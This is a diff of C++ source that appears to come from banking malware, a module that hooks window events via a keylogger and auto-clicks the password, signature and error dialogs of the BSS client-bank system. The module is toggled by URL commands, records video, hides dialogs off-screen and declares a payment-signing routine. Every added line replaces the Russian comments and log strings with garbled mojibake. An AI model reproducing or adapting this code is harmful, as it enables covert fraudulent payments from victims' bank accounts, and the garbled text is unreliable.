 	TBSSPasswordForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
-		// Для окно ввода пароля будем просто ожидать ввода
-		BDBG("bsssign","Перехвачено окно ввода пароля");
-		BSSSIGNLOG(Wnd, false, "Окно ввода пароля");
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
+		BSSSIGNLOG(Wnd, false, "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
     	FMaxWaitInterval = 30 * 60 * 1000;
 	}
 
-    // Проверяем является ли окно окном ввода пароля
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
 	{
-		// Этап первый: Окно должно быть диалогом, не иметь родителя.
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		if (((TBotCollection*)Clicker)->Count() == 0)
 			return false;
 
-		// Этап второй: проверяем вхождение слова пароль
-		// Нет данных как точно звучит заголовок окна
-		return Text.Pos("Пароль") >= 0;
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		return Text.Pos("пїЅпїЅпїЅпїЅпїЅпїЅ") >= 0;
 
 		/* TODO :
-		При получении дополнительных данных об окне ввода пароля
-		организовать нормальную фильтрацию окон. */
+		пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ. */
     }
 };
 
 
 //***********************************************
-// Кдасс кликания по окну вывода сообщения
-// об ошибке
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //***********************************************
 class TBSSErrorForm : public TBSSForm
 {
@@ -643,7 +654,7 @@ protected:
 
 	bool Click()
 	{
-		// Кликаем по кнопке Ok
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Ok
 		bool Clicked = BSSClickToButtons(FForm, false, FTextHash) > 0;
 		TBSSForm::Click();
 		return Clicked;
@@ -653,33 +664,33 @@ public:
 	TBSSErrorForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
-		BDBG("bsssign","Перехвачено окно ошибки");
-		BSSSIGNLOG(NULL, false, "Окно ошибки");
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
+		BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		#ifdef BSSSIGN_HIDE_WND
             Move(-1000, 0);
 		#endif
 
 		FTextHash = 0x27EB /* Ok */;
-		//FTextHash = 0x18B5 /* ОК */; // Для тестов
+		//FTextHash = 0x18B5 /* пїЅпїЅ */; // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		FClassHash = 0;
 	};
 
-	// Функция возвращает истину если это окно ошибки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	bool static IsErrorForm(TBSSClicker* Clicker, DWORD ClassHash, DWORD TextHash)
 	{
-		//return  TextHash  == 0x72E78B17 /* Ошибка */;
+		//return  TextHash  == 0x72E78B17 /* пїЅпїЅпїЅпїЅпїЅпїЅ */;
 
 		return  ((TBotCollection*)Clicker)->Count() > 0 &&
 				ClassHash == BSS_FORM_CLASS_HASH &&
-				TextHash  == 0x72E78B17 /* Ошибка */;
+				TextHash  == 0x72E78B17 /* пїЅпїЅпїЅпїЅпїЅпїЅ */;
     }
 
 };
 
 
 //****************************************************************************
-//  Класс кликания по кнопкам формы
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //****************************************************************************
 
 class TBSSClicker : public TBotCollection
@@ -693,7 +704,7 @@ private:
 
 	void CheckForm()
 	{
-		// Функция проверяет валидность окон
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		TLock Locker = GetLocker();
 
 		for (int i = Count() - 1; i >= 0; i--)
@@ -705,10 +716,10 @@ private:
 	}
 	//-------------------------------------------------------------------
 
-	// Функция кликает по окнам системы BSS
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS
 	void Execute()
 	{
-		// Выполняем цикл пока в коллекции есть окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		pSleep(500);
 
 		do
@@ -728,7 +739,7 @@ private:
 			pSleep(500);
 
 
-			// Проверяем необходимость завершения
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			TLock L = GetLocker();
 			FRunning = Count() > 0 && FActive;
 			if (!FRunning) break;
@@ -751,23 +762,23 @@ public:
 
 	void SetActive(bool Value)
 	{
-		BDBG("bsssign","Активация системы BSS кликера. Активно=%d", Value);
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ=%d", Value);
         FActive = Value;
 	}
 	//------------------------------------------------------------------------
 
 	bool IsDialog(HWND Wnd)
 	{
-		// Функция возвращает истину если окно является диалоговым окном
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 		HWND Owner = (HWND)pGetWindow(Wnd, GW_OWNER);
 
-		// Наличие окна владельца предполагает, что окно является диалоговым
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         return Owner != NULL;
 	}
 	//------------------------------------------------------------------------
 
-    // Добавляем форму для клика
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool AddForm(HWND WND)
 	{
 		if (!FActive || !IsDialog(WND))
@@ -780,29 +791,29 @@ public:
 
 		TBSSForm* Form = NULL;
 
-		BDBG("bsssign","Обрабатываем окно: \r\n  Class: %s \r\n  Text: %s", Class.t_str(), Text.t_str());
+		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: \r\n  Class: %s \r\n  Text: %s", Class.t_str(), Text.t_str());
 
-        // Проверяем окно установки подписей
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (TBSSSignForm::IsSignForm(ClassHash, TextHash))
 			Form = new TBSSSignForm(this, WND);
 		else
-		// Проверяем окно ввода пароля
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (TBSSPasswordForm::IsPasswordForm(this, WND, Text))
 			Form = new TBSSPasswordForm(this, WND);
 		else
-		// Проврям окно ошибок
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
 			Form = new TBSSErrorForm(this, WND);
 
-		// Логируем информацию об окне
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 		#ifdef LOG_BSS_SIGN
 			if (Logger && !Text.IsEmpty())
 			{
-				// Получаем надписи всех окон
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				PCHAR WndText = GetAllWindowsText(WND, true, true);
 				if (WndText)
 				{
-					Logger->Write(NULL, false, "Отображается окно: ");
+					Logger->Write(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: ");
                     Logger->AddTextFile(Text.t_str(), WndText, 0);
 					STR::Free(WndText);
                 }
@@ -812,10 +823,10 @@ public:
 
 		if (!Form) return false;
 
-        BSSSIGNLOG(NULL, false, "Обрабатываем форму [%s]", Text.t_str());
+        BSSSIGNLOG(NULL, false, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ [%s]", Text.t_str());
 
 
-		// Запускаем поток
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		TLock L = GetLocker();
 		if (!FRunning)
 		{
@@ -843,16 +854,16 @@ DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker)
 namespace BSSSign
 {
 
-    TBSSClicker* Clicker = NULL; // Система кликания ко кнопкам BSS
+    TBSSClicker* Clicker = NULL; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS
 
 	bool RecordVideo = false;
 	RECT WindowRect;
 
 
-	// Хук отображения окна
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	void WINAPI Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data);
 
-	// Функция подписывает платёж
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	DWORD WINAPI SignPayment(LPVOID Data);
 
 }
@@ -862,7 +873,7 @@ namespace BSSSign
 //----------------------------------------------------------------------------
 void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 {
-    // Обрабатываем отображение окон
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PShowWindowData WndData = (PShowWindowData)Data;
 	int Cmd = WndData->Command;
 	HWND Wnd = WndData->Window;
@@ -874,9 +885,9 @@ void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 
 void BSSSign::CheckRequest(PCHAR URL)
 {
-	//  Функция проверяет запрос на предмет
-	//  адрес запроса на предмет наличия в нём
-	//  команды управления
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (STR::IsEmpty(URL))
 		return;
@@ -885,7 +896,7 @@ void BSSSign::CheckRequest(PCHAR URL)
 	if ( CompareUrl( "*az_start", URL ) )
 	{
 		#ifdef LOG_BSS_SIGN
-			// Создаём объект логирования
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (!Logger)
             	Logger = new TBSSSignLog;
 		#endif
@@ -893,18 +904,18 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 		Clicker->SetActive(true);
 
-		// Если с данного процесса не запущена запись видео
-		// то принудительно стартуем её
+		// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
 		//RecordVideo = !VideoRecorderSrv::PingClient(0);
 		//if (RecordVideo)
 			RecordVideo = VideoProcess::RecordPID( 0, BSSSignName );
 
-        BSSSIGNLOG(NULL, true, "Получена команда СТАРТ");
+        BSSSIGNLOG(NULL, true, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 	}
 	else
 	if ( CompareUrl( "*az_stop", URL ) )
 	{
-		BSSSIGNLOG(NULL, true, "Получена команда СТОП");
+		BSSSIGNLOG(NULL, true, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 
 		Clicker->SetActive(false);
 		if (RecordVideo)
@@ -914,7 +925,7 @@ void BSSSign::CheckRequest(PCHAR URL)
 		}
 
 		#ifdef LOG_BSS_SIGN
-			// Уничтожаем объект логирования
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			delete Logger;
 			Logger = NULL;
 		#endif
@@ -923,13 +934,13 @@ void BSSSign::CheckRequest(PCHAR URL)
 //	if ( CompareUrl( "*blind_up", URL ) )
 //	{
 //
-//		BDBG("bsssign","Blind=true; тоесть хайдим главное окно ие");
+//		BDBG("bsssign","Blind=true; пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ");
 //		Blind = true;
 //	}
 //	else
 //	if ( CompareUrl( "*blind_down", URL ) )
 //	{
-//		BDBG("bsssign","Возвращаем видимость окна");
+//		BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 //		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);
 //
 //		Blind = false;
@@ -938,14 +949,14 @@ void BSSSign::CheckRequest(PCHAR URL)
 //	if ((CompareUrl( "*move_up", URL)) && (!Move))
 //	{
 //
-//		BDBG("bsssign","окно ие в право");
+//		BDBG("bsssign","пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ");
 //		HWND Wind = (HWND)pFindWindowA("IEFrame", NULL);
 //		pGetWindowRect(Wind,&WindowRect);
 //		int x =(int)pGetSystemMetrics( SM_CXSCREEN );
 //		int y =(int)pGetSystemMetrics( SM_CYSCREEN );
 //
-//		BDBG("bsssign","окно ие в право %d",x);
-//		BDBG("bsssign","окно ие в право %d",y);
+//		BDBG("bsssign","пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ %d",x);
+//		BDBG("bsssign","пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ %d",y);
 //		pMoveWindow(Wind,x,0,WindowRect.right-WindowRect.left,WindowRect.bottom-WindowRect.top,FALSE);
 //
 //		Move=true;
@@ -953,7 +964,7 @@ void BSSSign::CheckRequest(PCHAR URL)
 //	else
 //	if (( CompareUrl( "*move_down", URL ) )&&(Move))
 //	{
-//		BDBG("bsssign","Окно ие на место");
+//		BDBG("bsssign","пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 //		HWND Wind = (HWND)pFindWindowA("IEFrame",NULL);
 //		pMoveWindow(Wind,WindowRect.left ,WindowRect.top ,WindowRect.right-WindowRect.left,WindowRect.bottom - WindowRect.top,TRUE);
 //
@@ -965,8 +976,8 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 void BSSSign::Initialize()
 {
-	// Функция инициализирует систему подписи BSS
-	BDBG("bsssign","Инициализируем BSS кликер");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS
+	BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	Clicker = new TBSSClicker();
 
@@ -978,7 +989,7 @@ void BSSSign::Initialize()
 
 	bool Connected = KeyLogger::ConnectEventHandler(KLE_SHOW_WND, Event_ShowWindow);
 	if (Connected)
-    	BDBG("bsssign","Событие подключено");
+    	BDBG("bsssign","пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 }
 
 
